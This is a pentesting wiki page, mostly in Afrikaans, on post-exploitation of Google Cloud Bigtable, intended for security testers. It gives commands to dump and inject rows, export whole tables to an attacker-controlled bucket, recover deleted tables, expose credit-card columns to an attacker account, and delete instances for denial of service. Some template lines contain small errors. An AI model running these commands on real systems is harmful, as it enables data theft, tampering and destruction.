# GCP - Bigtable Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

Vir meer inligting oor Bigtable, kyk:

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

> [!TIP]
> Installeer die `cbt` CLI eenmalig via die Cloud SDK sodat die onderstaande opdragte plaaslik werk:
>
> ```bash
> gcloud components install cbt
> ```

### Lees rye

**Permissies:** `bigtable.tables.readRows`

Die `cbt` kom met die Cloud SDK en kommunikeer direk met die admin/data APIs sonder enige middleware. Wys dit na die gekompromitteerde projek/instansie en dump rye direk vanaf die tabel. Beperk die skandering as jy net wil kyk.
```bash
# Install cbt
gcloud components update
gcloud components install cbt

# Read entries with creds of gcloud
cbt -project=<victim-proj> -instance=<instance-id> read <table-id>
```
### Skryf rye

**Toestemmings:** `bigtable.tables.mutateRows`, (jy sal `bigtable.tables.readRows` nodig hê om die verandering te bevestig).

Gebruik dieselfde hulpmiddel om arbitrêre selle te upsert. Dit is die vinnigste manier om configs te backdoor, web shells te drop, of poisoned dataset rows te plant.
```bash
# Inject a new row
cbt -project=<victim-proj> -instance=<instance-id> set <table> <row-key> <family>:<column>=<value>

cbt -project=<victim-proj> -instance=<instance-id> set <table-id> user#1337 profile:name="Mallory" profile:role="admin" secrets:api_key=@/tmp/stealme.bin

# Verify the injected row
cbt -project=<victim-proj> -instance=<instance-id> read <table-id> rows=user#1337
```
`cbt set` aanvaar ruwe bytes via die `@/path` sintaksis, sodat jy gecompileerde payloads of geserialiseerde protobufs presies kan stoot soos downstream-dienste dit verwag.

### Exfiltreer rye na jou bucket

**Permissies:** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs`

Dit is moontlik om die inhoud van 'n volledige tabel na 'n bucket wat deur die aanvaller beheer word uit te voer deur 'n Dataflow job te loods wat rye na 'n GCS bucket wat jy beheer, stroom.

> [!NOTE]
> Let wel dat jy die permissie `iam.serviceAccounts.actAs` oor 'n SA met genoeg permissies sal benodig om die eksport uit te voer (by verstek, tensy anders aangedui, sal die standaard compute SA gebruik word).
```bash
gcloud dataflow jobs run <job-name> \
--gcs-location=gs://dataflow-templates-us-<REGION>/<VERSION>/Cloud_Bigtable_to_GCS_Json \
--project=<PROJECT> \
--region=<REGION> \
--parameters=<PROJECT>,bigtableInstanceId=<INSTANCE_ID>,bigtableTableId=<TABLE_ID>,filenamePrefix=<PREFIX>,outputDirectory=gs://<BUCKET>/raw-json/ \
--staging-location=gs://<BUCKET>/staging/

# Example
gcloud dataflow jobs run dump-bigtable3 \
--gcs-location=gs://dataflow-templates-us-central1/latest/Cloud_Bigtable_to_GCS_Json \
--project=gcp-labs-3uis1xlx \
--region=us-central1 \
--parameters=bigtableProjectId=gcp-labs-3uis1xlx,bigtableInstanceId=avesc-20251118172913,bigtableTableId=prod-orders,filenamePrefix=prefx,outputDirectory=gs://deleteme20u9843rhfioue/raw-json/ \
--staging-location=gs://deleteme20u9843rhfioue/staging/
```
> [!NOTE]
> Switch the template to `Cloud_Bigtable_to_GCS_Parquet` or `Cloud_Bigtable_to_GCS_SequenceFile` if you want Parquet/SequenceFile outputs instead of JSON. The permissions are the same; only the template path changes.

### Import rows

**Toestemmings:** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs`

Dit is moontlik om die inhoud van 'n hele tabel in te voer vanaf 'n bucket wat deur die aanvaller beheer word deur 'n Dataflow-job te loods wat rye na 'n GCS-bucket wat jy beheer stroom. Hiervoor sal die aanvaller eers 'n parquet-lêer moet skep met die data wat ingevoer moet word en die verwagte schema. 'n Aanvaller kan eers die data in parquet-formaat uitvoer volgens die vorige tegniek met die instelling `Cloud_Bigtable_to_GCS_Parquet` en nuwe inskrywings by die afgelaaide parquet-lêer voeg



> [!NOTE]
> Note that you will need the permission `iam.serviceAccounts.actAs` over a some SA with enough permissions to perform the export (by default, if not aindicated otherwise, the default compute SA will be used).
```bash
gcloud dataflow jobs run import-bt-$(date +%s) \
--region=<REGION> \
--gcs-location=gs://dataflow-templates-<REGION>/<VERSION>>/GCS_Parquet_to_Cloud_Bigtable \
--project=<PROJECT> \
--parameters=bigtableProjectId=<PROJECT>,bigtableInstanceId=<INSTANCE-ID>,bigtableTableId=<TABLE-ID>,inputFilePattern=gs://<BUCKET>/import/bigtable_import.parquet \
--staging-location=gs://<BUCKET>/staging/

# Example
gcloud dataflow jobs run import-bt-$(date +%s) \
--region=us-central1 \
--gcs-location=gs://dataflow-templates-us-central1/latest/GCS_Parquet_to_Cloud_Bigtable \
--project=gcp-labs-3uis1xlx \
--parameters=bigtableProjectId=gcp-labs-3uis1xlx,bigtableInstanceId=avesc-20251118172913,bigtableTableId=prod-orders,inputFilePattern=gs://deleteme20u9843rhfioue/import/parquet_prefx-00000-of-00001.parquet \
--staging-location=gs://deleteme20u9843rhfioue/staging/
```
### Herstel van backups

**Toestemmings:** `bigtable.backups.restore`, `bigtable.tables.create`.

'n aanvaller met hierdie toestemmings kan 'n backup na 'n nuwe tabel onder sy beheer herstel om toegang tot ou sensitiewe data te kry.
```bash
gcloud bigtable backups list --instance=<INSTANCE_ID_SOURCE> \
--cluster=<CLUSTER_ID_SOURCE>

gcloud bigtable instances tables restore \
--source=projects/<PROJECT_ID_SOURCE>/instances/<INSTANCE_ID_SOURCE>/clusters/<CLUSTER_ID>/backups/<BACKUP_ID> \
--async \
--destination=<TABLE_ID_NEW> \
--destination-instance=<INSTANCE_ID_DESTINATION> \
--project=<PROJECT_ID_DESTINATION>
```
### Herstel verwyderde tabelle

**Permissies:** `bigtable.tables.undelete`

Bigtable ondersteun sagte verwydering met 'n respytperiode (gewoonlik 7 dae standaard). Gedurende hierdie venster kan 'n attacker met die `bigtable.tables.undelete` permissie 'n onlangs verwyderde tabel herstel en al die data daarvan terugkry, moontlik toegang verkry tot sensitiewe inligting wat as vernietig beskou is.

Dit is veral nuttig vir:
- Herstel van data uit tabelle wat deur defenders tydens incident response verwyder is
- Toegang tot historiese data wat doelbewus uitgevee is
- Om onopsetlike of kwaadwillige verwyderings om te keer om persistence te handhaaf
```bash
# List recently deleted tables (requires bigtable.tables.list)
gcloud bigtable instances tables list --instance=<instance-id> \
--show-deleted

# Undelete a table within the retention period
gcloud bigtable instances tables undelete <table-id> \
--instance=<instance-id>
```
> [!NOTE]
> Die undelete-operasie werk slegs binne die gekonfigureerde retensieperiode (standaard 7 dae). Nadat hierdie venster verstryk het, word die tabel en die data permanent verwyder en kan nie deur hierdie metode herstel word nie.


### Skep Authorized Views

**Permissions:** `bigtable.authorizedViews.create`, `bigtable.tables.readRows`, `bigtable.tables.mutateRows`

Authorized views laat jou 'n gekose substel van die tabel aanbied. In plaas daarvan om least privilege te eerbiedig, gebruik dit om **presies die sensitiewe kolom-/rystelle** wat jou interesseer te publiseer en jou eie principal op die whitelist te plaas.

> [!WARNING]
> Die probleem is dat om 'n authorized view te skep jy ook in staat moet wees om rye in die basistabel te lees en te muteer; dus verwerf jy geen ekstra toestemming nie, en daarom is hierdie tegniek oor die algemeen nutteloos.
```bash
cat <<'EOF' > /tmp/credit-cards.json
{
"subsetView": {
"rowPrefixes": ["acct#"],
"familySubsets": {
"pii": {
"qualifiers": ["cc_number", "cc_cvv"]
}
}
}
}
EOF

gcloud bigtable authorized-views create card-dump \
--instance=<instance-id> --table=<table-id> \
--definition-file=/tmp/credit-cards.json

gcloud bigtable authorized-views add-iam-policy-binding card-dump \
--instance=<instance-id> --table=<table-id> \
--member='user:<attacker@example.com>' --role='roles/bigtable.reader'
```
Omdat toegang tot die aansig beperk is, onderskat verdedigers dikwels die feit dat jy net 'n nuwe hoogs-sensitiewe eindpunt geskep het.

### Lees Gemagtigde Aansigte

**Permissies:** `bigtable.authorizedViews.readRows`

As jy toegang het tot 'n gemagtigde aansig, kan jy data daaruit lees met die Bigtable kliëntbiblioteke deur die naam van die gemagtigde aansig in jou leesversoeke te spesifiseer. Let wel dat die gemagtigde aansig waarskynlik sal beperk watter data jy uit die tabel kan kry. Hieronder is 'n voorbeeld in Python:
```python
from google.cloud import bigtable
from google.cloud.bigtable_v2 import BigtableClient as DataClient
from google.cloud.bigtable_v2 import ReadRowsRequest

# Set your project, instance, table, view id
PROJECT_ID = "gcp-labs-3uis1xlx"
INSTANCE_ID = "avesc-20251118172913"
TABLE_ID = "prod-orders"
AUTHORIZED_VIEW_ID = "auth_view"

client = bigtable.Client(project=PROJECT_ID, admin=True)
instance = client.instance(INSTANCE_ID)
table = instance.table(TABLE_ID)

data_client = DataClient()
authorized_view_name = f"projects/{PROJECT_ID}/instances/{INSTANCE_ID}/tables/{TABLE_ID}/authorizedViews/{AUTHORIZED_VIEW_ID}"

request = ReadRowsRequest(
authorized_view_name=authorized_view_name
)

rows = data_client.read_rows(request=request)
for response in rows:
for chunk in response.chunks:
if chunk.row_key:
row_key = chunk.row_key.decode('utf-8') if isinstance(chunk.row_key, bytes) else chunk.row_key
print(f"Row: {row_key}")
if chunk.family_name:
family = chunk.family_name.value if hasattr(chunk.family_name, 'value') else chunk.family_name
qualifier = chunk.qualifier.value.decode('utf-8') if hasattr(chunk.qualifier, 'value') else chunk.qualifier.decode('utf-8')
value = chunk.value.decode('utf-8') if isinstance(chunk.value, bytes) else str(chunk.value)
print(f"  {family}:{qualifier} = {value}")
```
### Denial of Service via Delete Operations

**Permissions:** `bigtable.appProfiles.delete`, `bigtable.authorizedViews.delete`, `bigtable.authorizedViews.deleteTagBinding`, `bigtable.backups.delete`, `bigtable.clusters.delete`, `bigtable.instances.delete`, `bigtable.tables.delete`

Enige van die Bigtable delete permissions kan gebruik word vir denial of service-aanvalle. 'n Aanvaller met hierdie permissions kan bedrywighede ontwrig deur kritieke Bigtable-bronne te delete:

- **`bigtable.appProfiles.delete`**: Delete application profiles, waardeur kliëntverbindings en roeteringskonfigurasies verbreek word
- **`bigtable.authorizedViews.delete`**: Remove authorized views, waardeur wettige toegangspade vir toepassings afgesny word
- **`bigtable.authorizedViews.deleteTagBinding`**: Remove tag bindings from authorized views, wat tag-bindings verwyder wat toegangskontroles kan beïnvloed
- **`bigtable.backups.delete`**: Destroy backup snapshots, waardeur rampherstelopsies uitgeskakel word
- **`bigtable.clusters.delete`**: Delete entire clusters, wat onmiddellike onbeskikbaarheid van data veroorsaak
- **`bigtable.instances.delete`**: Remove complete Bigtable instances, wat alle tabelle en konfigurasies uitwis
- **`bigtable.tables.delete`**: Delete individual tables, wat dataverlies en toepassingsfoute veroorsaak
```bash
# Delete a table
gcloud bigtable instances tables delete <table-id> \
--instance=<instance-id>

# Delete an authorized view
gcloud bigtable authorized-views delete <view-id> \
--instance=<instance-id> --table=<table-id>

# Delete a backup
gcloud bigtable backups delete <backup-id> \
--instance=<instance-id> --cluster=<cluster-id>

# Delete an app profile
gcloud bigtable app-profiles delete <profile-id> \
--instance=<instance-id>

# Delete a cluster
gcloud bigtable clusters delete <cluster-id> \
--instance=<instance-id>

# Delete an entire instance
gcloud bigtable instances delete <instance-id>
```
> [!WARNING]
> Verwyderingsoperasies is dikwels onmiddellik en onomkeerbaar. Maak seker dat daar rugsteun is voordat u hierdie opdragte toets, aangesien dit permanente dataverlies en ernstige diensonderbreking kan veroorsaak.

{{#include ../../../banners/hacktricks-training.md}}
